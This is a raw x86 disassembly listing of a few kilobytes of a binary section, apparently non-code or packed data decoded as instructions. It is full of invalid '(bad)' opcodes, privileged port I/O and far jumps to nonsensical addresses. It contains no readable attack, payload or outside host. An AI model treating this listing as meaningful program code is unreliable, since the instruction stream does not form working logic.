  41625d:	outs   dx,BYTE PTR ds:[esi]
  41625e:	mov    es,esp
  416260:	xor    BYTE PTR [esp+ebp*8-0x31a3bf2],bl
  416267:	and    edi,ecx
  416269:	adc    dh,BYTE PTR [edi+edi*2-0x5f4d4c0f]
  416270:	std    
  416271:	pop    ebx
  416272:	push   edx
  416273:	imul   ch
  416275:	cs dec esp
  416277:	test   al,0xd7
  416279:	xchg   ebp,eax
  41627a:	add    al,0xd4
  41627c:	fnstcw WORD PTR [ebx-0x3fd32524]
  416282:	(bad)  [eax]
  416284:	not    DWORD PTR [esi+0x7d429fb9]
  41628a:	pusha  
  41628b:	or     eax,0x2844316f
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c3e:0x412aaeee
  416305:	jmp    0x0:0x1040000
  41630c:	stos   BYTE PTR es:[edi],al
  41630d:	scas   eax,DWORD PTR es:[edi]
  41630e:	retf   0x486f
  416311:	imul   ebp,esi,0xb578fd9e
  416317:	mov    edx,0xde5220b9
  41631c:	xor    al,0xf3
  41631e:	jnp    0x41632b
  416320:	mov    BYTE PTR [eax],dl
  416322:	ss xchg esi,eax
  416324:	push   cs
  416325:	sbb    al,0x32
  416327:	enter  0xb7eb,0x8c
  41632b:	js     0x416368
  41632d:	mov    ecx,0xcf13da26
  416332:	sub    eax,DWORD PTR [ebp-0x2c45dbc5]
  416338:	push   eax
  416339:	mov    WORD PTR [esi-0x7f],ds
  41633c:	addr16 ds jbe 0x4162ca
  416340:	mov    esi,0x4ff54974
  416345:	dec    edx
  416346:	push   esi
  416347:	std    
  416348:	add    eax,DWORD PTR [esi-0x39]
  41634b:	out    0x88,eax
  41634d:	mov    ds,WORD PTR [esi-0x20]
  416350:	aad    0x70
  416352:	fst    QWORD PTR [eax+0xc]
  416355:	cmp    dh,bl
  416357:	xchg   ecx,eax
  416358:	fs mov ebp,0x50f4243c
  41635e:	mov    ebp,ebx
  416360:	jno    0x4163b9
  416362:	pop    ebx
  416363:	or     DWORD PTR [ecx+0x15bd280e],edi
  416369:	mov    ebx,0x6b67c321
  41636e:	pop    ss
  41636f:	inc    ecx
  416370:	pop    esp
  416371:	inc    ecx
  416372:	cmp    al,0x38
  416374:	pop    ebx
  416375:	jg     0x416354
  416377:	cli    
  416378:	loop   0x4163f8
  41637a:	mov    dh,0x68
  41637c:	or     al,0xde
  41637e:	(bad)  
  41637f:	mov    ebp,0x72604d8c
  416384:	pop    esp
  416385:	jne    0x416381
  416387:	gs push esp
  416389:	push   esi
  41638a:	jle    0x4163c5
  41638c:	xor    eax,0xc803812
  416391:	xor    eax,0xe1e834c3
  416396:	and    BYTE PTR ds:0x7b7ce8af,cl
  41639c:	mov    esp,0xde2c7eb3
  4163a1:	sbb    eax,0x6cb5770d
  4163a6:	rol    DWORD PTR [edi-0x68f7db24],0xfc
  4163ad:	scas   al,BYTE PTR es:[edi]
  4163ae:	add    DWORD PTR [ecx],esp
  4163b0:	or     bl,BYTE PTR [esp+edi*2-0x63d25965]
  4163b7:	cmp    eax,0x7f7a0a7c
  4163bc:	in     eax,0xb2
  4163be:	gs (bad) 
  4163c0:	cs adc bl,ch
  4163c3:	or     DWORD PTR [ebx-0x26529055],esp
  4163c9:	cmp    DWORD PTR ds:0xf778a51c,edx
  4163cf:	aam    0xd1
  4163d1:	jmp    0xa1a8a445
  4163d6:	jecxz  0x4163b2
  4163d8:	ret    
  4163d9:	fwait
  4163da:	lds    esp,FWORD PTR [ecx-0x3a735194]
  4163e0:	rcl    bl,cl
  4163e2:	jmp    FWORD PTR [ebp+0x46e2b1cc]
  4163e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e9:	loope  0x416458
  4163eb:	mov    BYTE PTR [edx],cl
  4163ed:	out    dx,eax
  4163ee:	call   0x4dda:0x309ab313
  4163f5:	jne    0x4163c9
  4163f7:	xchg   edx,eax
  4163f8:	mov    bh,0xad
  4163fa:	sti    
  4163fb:	retf   0xd338
  4163fe:	sahf   
  4163ff:	into   
  416400:	hlt    
  416401:	(bad)  
  416403:	xor    eax,eax
  416405:	stc    
  416406:	cmp    al,0x61
  416408:	aaa    
  416409:	int    0xc8
  41640b:	mov    ?,WORD PTR [esi+0x49]
  41640e:	cdq    
  41640f:	pop    ds
	...
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	div    BYTE PTR [eax]
  416482:	lods   eax,DWORD PTR ds:[esi]
  416483:	test   eax,0xeb40
  416488:	add    al,0x1
  41648a:	add    BYTE PTR [eax],al
  41648c:	scas   al,BYTE PTR es:[edi]
  41648d:	xchg   esi,eax
  41648e:	mov    eax,ds:0xa741d2bf
  416493:	fdiv   st,st(1)
  416495:	in     al,dx
  416496:	iret   
  416497:	outs   dx,DWORD PTR ds:[esi]
  416498:	call   0xe546406d
  41649d:	jle    0x416513
  41649f:	(bad)  
  4164a0:	out    dx,eax
  4164a1:	mov    eax,ds:0x4bbfb11
  4164a6:	ja     0x4164a1
  4164a8:	rcr    DWORD PTR [ebx+ecx*2+0x3c],cl
  4164ac:	lock hlt 
  4164ae:	mov    ah,ah
  4164b0:	ss stc 
  4164b2:	add    al,cl
  4164b4:	jp     0x416526
  4164b6:	retf   
  4164b7:	sti    
  4164b8:	xchg   ebp,eax
  4164b9:	xor    BYTE PTR [esi+0xaa64985],dl
  4164bf:	mov    ss,WORD PTR [ecx+0x344e2217]
  4164c5:	and    BYTE PTR [esi-0x53a78ae],dh
  4164cb:	int    0x91
  4164cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164ce:	sub    DWORD PTR [ebp+0x17d5c777],esp
  4164d4:	repnz mov BYTE PTR [ecx],dl
  4164d7:	nop
  4164d8:	call   0x8773:0xe69cc08
  4164df:	(bad)  
  4164e0:	aam    0xe5
  4164e2:	stos   DWORD PTR es:[edi],eax
  4164e3:	repz aaa 
  4164e5:	hlt    
  4164e6:	in     eax,dx
  4164e7:	inc    esp
  4164e8:	icebp  
  4164e9:	push   0x6226a0f0
  4164ee:	xor    BYTE PTR [eax-0x54],0x8d
  4164f2:	pop    esp
  4164f3:	sub    DWORD PTR ds:0xc74858d4,0xffffffae
  4164fa:	js     0x416531
  4164fc:	stc    
  4164fd:	pop    edx
  4164fe:	push   ebp
  4164ff:	pop    ebx
  416500:	test   BYTE PTR [edi],dh
  416502:	cmp    esp,DWORD PTR [ecx]
  416504:	xchg   ecx,eax
  416505:	mov    ah,BYTE PTR [esi-0x56e11971]
  41650b:	inc    edi
  41650c:	addr16 in eax,0xce
  41650f:	pop    es
  416510:	clc    
  416511:	popa   
  416512:	cmc    
  416513:	dec    esi
  416514:	cmp    edi,DWORD PTR [edx+0x2f]
  416517:	dec    eax
  416518:	mov    ebx,0xbc034f0d
  41651d:	push   0x6f
  41651f:	push   ds
  416520:	adc    edi,edx
  416522:	bound  edi,QWORD PTR [eax+0x6d]
  416525:	mov    ebx,0x9e50a9ea
  41652a:	(bad)  
  41652b:	outs   dx,BYTE PTR ds:[esi]
  41652c:	and    al,0x7c
  41652e:	sar    BYTE PTR [edx+0x34],0xc6
  416532:	push   0x4f65a927
  416537:	rcl    BYTE PTR [ebx-0x18],cl
  41653a:	hlt    
  41653b:	pusha  
  41653c:	cld    
  41653d:	add    dh,BYTE PTR [edx]
  41653f:	dec    ebx
  416540:	xor    eax,0x7722c9a2
  416545:	fbld   TBYTE PTR [edx-0x2c5730cc]
  41654b:	imul   ebx,edi,0x192ff6ac
  416551:	popa   
  416552:	and    eax,0xae84b4cd
  416557:	lea    ebx,[ebx]
  416559:	popa   
  41655a:	loop   0x4164f1
  41655c:	mov    eax,0xa745249b
  416561:	jnp    0x4165df
  416563:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  416565:	les    eax,FWORD PTR [ebx]
  416567:	arpl   WORD PTR [ebx],bx
  416569:	shr    dh,0x9d
  41656c:	cld    
  41656d:	inc    ecx
  41656e:	addr16 in eax,dx
  416570:	sub    ebx,esp
  416572:	data16 (bad) 
  416574:	or     ebx,esi
  416576:	mov    bl,0xc7
  416578:	jl     0x4164fc
  41657a:	rcr    DWORD PTR [eax+0x6d],0x8e
  41657e:	pop    ss
  41657f:	mov    ebx,ecx
  416581:	scas   eax,DWORD PTR es:[edi]
  416582:	mov    ebx,0x566612cf
  416587:	dec    eax
  416588:	test   ecx,0xe2228904
  41658e:	fs jmp 0x416591
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x32b04354]
  416601:	retf   
  416602:	mov    ecx,0xec4455
  416607:	add    BYTE PTR [ecx+eax*1],al
  41660a:	add    BYTE PTR [eax],al
  41660c:	in     al,dx
  41660d:	push   edx
  41660e:	and    eax,0x39ca5986
  416613:	shl    BYTE PTR [esi-0xf68b646],0xe1
  41661a:	cmp    BYTE PTR ds:0x66b38b51,0x78
  416621:	jno    0x4165e5
  416623:	mov    ds:0x6e18aaf5,al
  416628:	jmp    0x4166a6
  41662a:	or     DWORD PTR [edi],esp
  41662c:	and    BYTE PTR [edi-0x68],0xc9
  416630:	pop    ss
  416631:	aad    0x50
  416633:	std    
  416634:	xor    edi,ebx
  416636:	imul   eax,DWORD PTR [ecx+0x7c],0xffffffc7
  41663a:	dec    ebx
  41663b:	mov    cs,WORD PTR [edx]
  41663d:	aam    0x53
  41663f:	mov    DWORD PTR [eax],0x70011c35
  416645:	push   edx
  416646:	mov    cl,0x18
  416648:	mov    ds,WORD PTR [edx]
  41664a:	pop    es
  41664b:	xor    BYTE PTR [edx+eiz*1+0x7b8a61b1],ch
  416652:	dec    edi
  416653:	ins    BYTE PTR es:[edi],dx
  416654:	dec    ebp
  416655:	cs pop es
  416657:	inc    edi
  416658:	stos   BYTE PTR es:[edi],al
  416659:	(bad)  
  41665b:	pop    ss
  41665c:	jecxz  0x416695
  41665e:	mov    WORD PTR [esi-0x6b],gs
  416661:	sbb    al,0x6
  416663:	int    0xac
  416665:	inc    edi
  416666:	mov    ch,0x64
  416668:	mov    eax,ds:0xb3a11d21
  41666d:	mov    ds:0x424f8394,al
  416672:	ror    BYTE PTR [eax-0x6912b039],cl
  416678:	pushw  0xffa7
  41667b:	inc    ecx
  41667c:	mov    dl,0xe8
  41667e:	mov    DWORD PTR [eax+edx*2],edx
  416681:	or     al,0xe5
  416683:	cmp    BYTE PTR [ecx+0x1f],bh
  416686:	jno    0x4166cd
  416688:	sti    
  416689:	xor    eax,DWORD PTR [eax+0x5a]
  41668c:	jae    0x41665e
  41668e:	and    BYTE PTR [esp+edx*8],ah
  416691:	call   0xeebedb38
  416696:	mov    dh,0xe0
  416698:	mov    esi,0x2476fc4d
  41669d:	mov    DWORD PTR [eax+0x6eb68601],ecx
  4166a3:	pusha  
  4166a4:	cmp    eax,0x5a88b453
  4166a9:	mov    ebp,0xe3b19d9b
  4166ae:	mov    al,ds:0x453dc279
  4166b3:	outs   dx,BYTE PTR ds:[esi]
  4166b4:	push   ebx
  4166b5:	xor    bl,bh
  4166b7:	dec    ecx
  4166b8:	inc    DWORD PTR [esi]
  4166ba:	mul    BYTE PTR [edx-0x1cb20033]
  4166c0:	mov    al,0x6a
  4166c2:	fisttp WORD PTR [edx]
  4166c4:	xchg   DWORD PTR [edx],ebp
  4166c6:	hlt    
  4166c7:	ins    BYTE PTR es:[edi],dx
  4166c8:	pop    ecx
  4166c9:	ss pusha 
  4166cb:	sub    ah,dh
  4166cd:	shl    dl,cl
  4166cf:	sbb    eax,0x7067320c
  4166d4:	or     eax,0x323f9987
  4166d9:	push   esp
  4166da:	sahf   
  4166db:	push   es
  4166dc:	cmp    bl,dh
  4166de:	scas   eax,DWORD PTR es:[edi]
  4166df:	mov    al,ds:0x961b6bf0
  4166e4:	pushf  
  4166e5:	pop    edx
  4166e6:	inc    edi
  4166e7:	adc    DWORD PTR [ebx+eiz*8],0xffffff84
  4166eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ec:	sbb    DWORD PTR ds:0x130fa70b,0x7e
  4166f3:	add    BYTE PTR [edx-0x3b],dh
  4166f6:	push   edx
  4166f7:	neg    bl
  4166f9:	dec    edi
  4166fa:	adc    ebx,edi
  4166fc:	jecxz  0x416710
  4166fe:	xlat   BYTE PTR ds:[ebx]
  4166ff:	sahf   
  416700:	fcom   DWORD PTR [ebp-0x277f5feb]
  416706:	int    0x47
  416708:	mov    ds:0x28edbbc,al
  41670d:	inc    esi
  41670e:	mov    dh,0xda
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	cwde   
  416781:	jno    0x416798
  416783:	test   DWORD PTR [eax-0x13],ecx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	or     dl,dh
  41678e:	dec    ebx
  41678f:	dec    eax
  416790:	jge    0x4167c5
  416792:	dec    edi
  416793:	jmp    0x33b26fae
  416798:	test   eax,0xbdd5b8e0
  41679d:	xor    BYTE PTR [edx+0xe93dc47],0x4e
  4167a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167a5:	sbb    BYTE PTR [ecx],bl
  4167a7:	ins    DWORD PTR es:[edi],dx
  4167a8:	jno    0x4167ff
  4167aa:	push   edx
  4167ab:	pop    eax
  4167ac:	enter  0x745c,0xb3
  4167b0:	ror    DWORD PTR [edx],0x6e
  4167b3:	lock hlt 
  4167b5:	(bad)  
  4167b6:	xor    bh,cl
  4167b8:	mov    eax,gs:0xb56e99
  4167be:	inc    ebp
  4167bf:	jl     0x4167a1
  4167c1:	aaa    
  4167c2:	ins    DWORD PTR es:[edi],dx
  4167c3:	cmc    
  4167c4:	or     al,0x5e
  4167c6:	rol    DWORD PTR [eax+0x73],0x55
  4167ca:	inc    esi
  4167cb:	int3   
  4167cc:	imul   esp,DWORD PTR [edx-0x1e],0xffffff9b
  4167d0:	dec    esp
  4167d1:	retf   0x11e9
  4167d4:	mov    WORD PTR [ebp-0x19],fs
  4167d7:	pop    es
  4167d8:	ret    0x54b8
  4167db:	xor    DWORD PTR [edx+ecx*8+0x5d8629c2],eax
  4167e2:	test   al,0x4e
  4167e4:	arpl   WORD PTR [edx],si
  4167e6:	popf   
  4167e7:	push   ebp
  4167e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e9:	mov    edx,0x77fd4f0a
  4167ee:	jp     0x416869
  4167f0:	jge    0x416787
  4167f2:	test   eax,0x5f25f9e5
  4167f7:	dec    ecx
  4167f8:	push   0xffffffe8
  4167fa:	xor    al,0xc2
  4167fc:	jge    0x41685a
  4167fe:	sbb    bh,BYTE PTR [ecx]
  416800:	mov    WORD PTR [edi+0x4f],es
  416803:	xchg   bh,bl
  416805:	add    cl,BYTE PTR [esi-0x61]
  416808:	(bad)  
  416809:	mov    dl,0xaa
  41680b:	sbb    DWORD PTR [esi-0x7f9a0f6c],esi
  416811:	out    0xee,eax
  416813:	(bad)  
  416814:	jbe    0x4167b4
  416816:	push   ds
  416817:	or     al,0x4d
  416819:	imul   esp,edi,0xcdaf4291
  41681f:	aaa    
  416820:	mov    ah,0x5
  416822:	xchg   esp,eax
  416823:	fwait
  416824:	jno    0x4167a7
  416826:	test   al,0x86
  416828:	gs mov al,0x76
  41682b:	cmp    DWORD PTR [edi+eiz*4],esi
  41682e:	push   0x1bddcf95
  416833:	and    esp,DWORD PTR [esi]
  416835:	lea    esi,[eax+edx*2-0x7b]
  416839:	bound  edi,QWORD PTR [esi+0xa]
  41683c:	inc    ebx
  41683d:	shr    BYTE PTR [ebp*4-0x2f53f56e],cl
  416844:	aaa    
  416845:	sbb    ebx,DWORD PTR [ebx]
  416847:	(bad)  
  416848:	pop    ebp
  416849:	ret    
  41684a:	mov    ebx,0x9f153b5
  41684f:	adc    esi,DWORD PTR [eax-0x28]
  416852:	push   ecx
  416853:	cli    
  416854:	dec    edx
  416855:	test   BYTE PTR [edi+ebp*4],bl
  416858:	mov    cl,0x99
  41685a:	push   ecx
  41685b:	add    esp,ebp
  41685d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41685e:	mov    ebp,es
  416860:	cli    
  416861:	arpl   WORD PTR [esi+eax*1+0x2c],bx
  416865:	cmp    DWORD PTR [edx-0x71],ebx
  416868:	out    0xd7,eax
  41686a:	mov    edi,DWORD PTR [ebx]
  41686c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41686d:	cmp    esi,ebx
  41686f:	adc    eax,0xf0b94df3
  416874:	pop    ecx
  416875:	mov    eax,ds:0x952f6402
  41687a:	(bad)  
  41687b:	xchg   ebp,eax
  41687c:	repnz ss xchg esp,eax
  41687f:	push   esp
  416880:	jb     0x416875
  416882:	cmp    eax,0x2fc75760
  416887:	inc    ebp
  416888:	dec    edi
  416889:	adc    DWORD PTR [edi],ebp
  41688b:	aaa    
  41688c:	popa   
  41688d:	out    dx,eax
  41688e:	xchg   ebx,eax
  41688f:	les    eax,FWORD PTR [eax]
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x5d30e0f3
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	pop    eax
  41690d:	test   BYTE PTR [esi],0xa
  416910:	nop
  416911:	sbb    DWORD PTR [ecx-0x51072c76],ebp
  416917:	and    al,0xf7
  416919:	mov    edi,0xdbda3265
  41691e:	xor    esp,esi
  416920:	cdq    
  416921:	xor    eax,0x2c705e4b
  416926:	sbb    bl,BYTE PTR [ecx]
  416928:	push   0x65
  41692a:	(bad)  
  41692b:	push   eax
  41692c:	mov    ecx,0xc0b86f1c
  416931:	test   DWORD PTR [eax+ebx*4-0x67],0xf411e883
  416939:	retf   0x865b
  41693c:	xchg   ecx,eax
  41693d:	test   BYTE PTR cs:[ebp+0x35de3cc5],bl
  416944:	and    DWORD PTR [edx],0xffffffda
  416947:	sub    esp,edx
  416949:	dec    esi
  41694a:	cmp    BYTE PTR [eax],dl
  41694c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41694d:	ss jmp 0x5eb3:0x3e4de3be
  416955:	push   edi
  416956:	sbb    al,0x6d
  416958:	int3   
  416959:	mov    dh,0xad
  41695b:	adc    eax,0x5e9b0388
  416960:	jle    0x416926
  416962:	(bad)  
  416963:	scas   al,BYTE PTR es:[edi]
  416964:	popa   
  416965:	lds    ecx,FWORD PTR [edx]
  416967:	call   0xac03:0xe42b975b
  41696e:	pop    esp
  41696f:	xor    DWORD PTR [ebx],ebp
  416971:	jns    0x416977
  416973:	test   al,0x56
  416975:	cwde   
  416976:	xchg   BYTE PTR [esi],bh
  416978:	scas   eax,DWORD PTR es:[edi]
  416979:	ins    DWORD PTR es:[edi],dx
  41697a:	lahf   
  41697b:	jmp    0x2a5964a
  416980:	mov    ebx,0xfb16d217
  416985:	pop    esi
  416986:	add    eax,0x2c6bc3fe
  41698b:	imul   edi,DWORD PTR [edx+0x6030fab0],0x5d
  416992:	pop    eax
  416993:	add    eax,0x2e6f0d36
  416998:	and    eax,DWORD PTR [esi-0x7]
  41699b:	inc    edx
  41699c:	push   0xfffffff4
  41699e:	dec    ebx
  41699f:	outs   dx,BYTE PTR ds:[esi]
  4169a0:	jg     0x4169e3
  4169a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169a3:	cmp    bl,BYTE PTR [ecx]
  4169a5:	shl    ebp,cl
  4169a7:	jmp    FWORD PTR [eax+0x450fcd45]
  4169ad:	clc    
  4169ae:	shl    ecx,0x90
  4169b1:	mov    eax,ds:0x8b78943b
  4169b6:	daa    
  4169b7:	fiadd  WORD PTR [esi+0x62]
  4169ba:	aas    
  4169bb:	jmp    0xe298:0xebdf1c1c
  4169c2:	pop    fs
  4169c4:	or     esp,DWORD PTR [esi+0x10]
  4169c7:	add    BYTE PTR [ecx-0x60],dh
  4169ca:	sbb    BYTE PTR [edi],ah
  4169cc:	ins    BYTE PTR es:[edi],dx
  4169cd:	xchg   ecx,eax
  4169ce:	or     al,0x6b
  4169d0:	ret    0x4a8c
  4169d3:	pop    edx
  4169d4:	shl    BYTE PTR [edi],cl
  4169d6:	xchg   esi,eax
  4169d7:	test   al,0x27
  4169d9:	inc    esp
  4169da:	out    0x71,al
  4169dc:	gs add al,0x85
  4169df:	clc    
  4169e0:	mov    edi,0x556baa4
  4169e5:	mov    BYTE PTR [esi-0x3a7bbedc],al
  4169eb:	sbb    esp,DWORD PTR [ebx+0x1ec764c6]
  4169f1:	inc    ecx
  4169f2:	and    al,0x87
  4169f4:	into   
  4169f5:	rcl    dh,1
  4169f7:	(bad)  
  4169f8:	push   ss
  4169f9:	jmp    0x473e1cd6
  4169fe:	push   es
  4169ff:	or     eax,0x6f7d60a6
  416a04:	mov    esi,0x276cde57
  416a09:	push   edx
  416a0a:	mov    bh,0xd6
  416a0c:	pop    ebp
  416a0d:	xor    al,BYTE PTR cs:[ebx+0x0]
	...
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xb1420ba3
  416a82:	retf   
  416a83:	pop    es
  416a84:	push   eax
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	mov    ah,0xb4
  416a8e:	sbb    BYTE PTR [ecx],dl
  416a90:	shl    DWORD PTR ds:0x1834779f,0xa6
  416a97:	sbb    ah,BYTE PTR ds:0xe0de54bf
  416a9d:	pop    edi
  416a9e:	and    ebx,DWORD PTR [esp+edx*4]
  416aa1:	shl    BYTE PTR [esi+0x32200755],1
  416aa7:	adc    DWORD PTR [edi-0x4c],0x38d0f33f
  416aae:	idiv   DWORD PTR [eax+ecx*1+0x47fc3708]
  416ab5:	or     bh,al
  416ab7:	jno    0x416a7e
  416ab9:	mov    al,BYTE PTR [ebp+0x71612646]
  416abf:	pop    es
  416ac0:	cwde   
  416ac1:	mov    esi,0xb37246c0
  416ac6:	in     eax,dx
  416ac7:	outs   dx,BYTE PTR ds:[esi]
  416ac8:	clc    
  416ac9:	leave  
  416aca:	fst    DWORD PTR [ebx-0x2c]
  416acd:	(bad)  
  416acf:	and    DWORD PTR [ebx],ecx
  416ad1:	jo     0x416ac1
  416ad3:	add    dh,BYTE PTR [esi+eax*2]
  416ad6:	das    
  416ad7:	push   es
  416ad8:	jae    0x416b3b
  416ada:	cli    
  416adb:	add    ebx,esp
  416add:	xor    BYTE PTR cs:[ecx-0x54b478b4],bh
  416ae4:	pop    ecx
  416ae5:	ficom  WORD PTR [ebp-0x792d21f9]
  416aeb:	fucom  st(1)
  416aed:	add    cl,BYTE PTR [ecx]
  416aef:	aam    0x47
  416af1:	ror    DWORD PTR [esi-0x66a017c5],0xc4
  416af8:	stos   BYTE PTR es:[edi],al
  416af9:	inc    edi
  416afa:	stos   DWORD PTR es:[edi],eax
  416afb:	and    edx,DWORD PTR [eax]
  416afd:	int    0x70
  416aff:	sar    cl,0xc
  416b02:	push   0xaa84eb52
  416b07:	mov    ah,0xb1
  416b09:	add    ecx,DWORD PTR [edi-0x9415516]
  416b0f:	fadd   st(2),st
  416b11:	add    ch,BYTE PTR [eax-0x2f]
  416b14:	lods   al,BYTE PTR ds:[esi]
  416b15:	neg    BYTE PTR [eax]
  416b17:	mov    edi,0xef48ca5b
  416b1c:	pop    ds
  416b1d:	ficomp DWORD PTR [esi+ecx*8]
  416b20:	xchg   esp,eax
  416b21:	aad    0xfa
  416b23:	mov    ch,0x4b
  416b25:	mov    ds:0xf11343bf,al
  416b2a:	push   esp
  416b2b:	lds    esp,FWORD PTR [esi+ecx*8+0x2e]
  416b2f:	iret   
  416b30:	pop    ebx
  416b31:	dec    edx
  416b32:	outs   dx,DWORD PTR ds:[esi]
  416b33:	fidiv  WORD PTR [ecx+eax*4-0x6fee53ce]
  416b3a:	pop    ds
  416b3b:	sbb    eax,esp
  416b3d:	test   al,0xda
  416b3f:	ds stc 
  416b41:	dec    edi
  416b42:	ret    0xd61e
  416b45:	stos   DWORD PTR es:[edi],eax
  416b46:	shl    DWORD PTR [ebp+0x35178215],cl
  416b4c:	pop    esp
  416b4d:	jl     0x416ae6
  416b4f:	cmp    ch,dl
  416b51:	ror    ch,1
  416b53:	sbb    eax,0xe451a23
  416b58:	je     0x416b8d
  416b5a:	jmp    0x8798e1fb
  416b5f:	out    dx,eax
  416b60:	loope  0x416b5a
  416b62:	xchg   esi,eax
  416b63:	lods   al,BYTE PTR ds:[esi]
  416b64:	loop   0x416b91
  416b66:	fcmove st,st(2)
  416b68:	pop    eax
  416b69:	sbb    eax,0xda97d7d
  416b6e:	lds    eax,FWORD PTR [esi]
  416b70:	xchg   ebx,eax
  416b71:	jne    0x416b24
  416b73:	jno    0x416b9c
  416b75:	adc    DWORD PTR [ebp-0x7665a376],ebp
  416b7b:	lock enter 0x99a8,0x3a
  416b80:	(bad)  
  416b81:	mov    edi,0xc2ef17d
  416b86:	adc    eax,0xd212c753
  416b8b:	imul   ecx,DWORD PTR [edi+0x255ab1],0x0
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x895b70a9
  416c01:	dec    ebx
  416c02:	mov    ds:0xf0545d,eax
  416c07:	add    BYTE PTR [ecx+eax*1],al
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	jnp    0x9275b8f0
  416c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c13:	add    al,0xc2
  416c15:	ins    BYTE PTR es:[edi],dx
  416c16:	push   edi
  416c17:	(bad)  
  416c18:	iret   
  416c19:	inc    eax
  416c1a:	pop    ds
  416c1b:	test   eax,0x151d58ee
  416c20:	adc    eax,0xffffffca
  416c23:	adc    cl,bl
  416c25:	or     DWORD PTR [ecx+0x361d795b],ebp
  416c2b:	arpl   WORD PTR [eax-0x761fbf4d],cx
  416c31:	retf   0x40d4
  416c34:	and    al,0x3e
  416c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c37:	je     0x416c47
  416c39:	lods   al,BYTE PTR ds:[esi]
  416c3a:	jecxz  0x416c0b
  416c3c:	push   0xffffffa6
  416c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c3f:	retf   
  416c40:	mov    ds:0x2c00be04,eax
  416c45:	jns    0x416c03
  416c47:	inc    ebx
  416c48:	sbb    DWORD PTR [esi],0xa9acd14b
  416c4e:	jl     0x416c23
  416c50:	rol    BYTE PTR [edi+0x7e],0x5d
  416c54:	adc    al,0xd1
  416c56:	sbb    edi,DWORD PTR [esi+0x37]
  416c59:	and    BYTE PTR [ebx-0x6046ba5c],ah
  416c5f:	mov    dl,0x76
  416c61:	outs   dx,BYTE PTR ds:[esi]
  416c62:	or     al,0xff
  416c64:	test   DWORD PTR [esi+0x54199a6b],ecx
  416c6a:	arpl   WORD PTR [edx],di
  416c6c:	jne    0x416cc4
  416c6e:	sub    al,0x12
  416c70:	sbb    dl,BYTE PTR [ebx+eax*8]
  416c73:	jmp    0x1162:0x20b3db19
  416c7a:	xor    esp,DWORD PTR [esi+eiz*8-0x63ab4499]
  416c81:	jmp    0x416c73
  416c83:	adc    al,BYTE PTR [ebp+0x6c]
  416c86:	or     BYTE PTR [ebp+0x679c6970],al
  416c8c:	stos   BYTE PTR es:[edi],al
  416c8d:	cmp    al,0x7
  416c8f:	pop    ds
  416c90:	ror    BYTE PTR [edx+0x538d3b66],1
  416c96:	and    BYTE PTR [ecx],bl
  416c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c99:	fmul   QWORD PTR [ecx]
  416c9b:	fisub  DWORD PTR [ebx+0x5b]
  416c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c9f:	call   0x8c9:0xe9a39a1d
  416ca6:	sbb    DWORD PTR [edx],ecx
  416ca8:	loop   0x416cff
  416caa:	clc    
  416cab:	gs push esi
  416cad:	and    al,0x91
  416caf:	sub    eax,DWORD PTR [edx+0x70]
  416cb2:	jle    0x416c4f
  416cb4:	pop    esi
  416cb5:	outs   dx,DWORD PTR ds:[esi]
  416cb6:	(bad)  
  416cb7:	lahf   
  416cb8:	dec    edx
  416cb9:	adc    DWORD PTR [ebx],ebp
  416cbb:	xchg   ebx,eax
  416cbc:	das    
  416cbd:	add    esp,ecx
  416cbf:	xor    al,0x6f
  416cc1:	jecxz  0x416caa
  416cc3:	(bad)  
  416cc4:	fstp   TBYTE PTR [ecx-0x32]
  416cc7:	loop   0x416d37
  416cc9:	ins    DWORD PTR es:[edi],dx
  416cca:	cli    
  416ccb:	mov    esi,0xf691ce15
  416cd0:	loope  0x416d0d
  416cd2:	sub    eax,0x6d220696
  416cd7:	getsec 
  416cd9:	mov    dh,0xbe
  416cdb:	loope  0x416c87
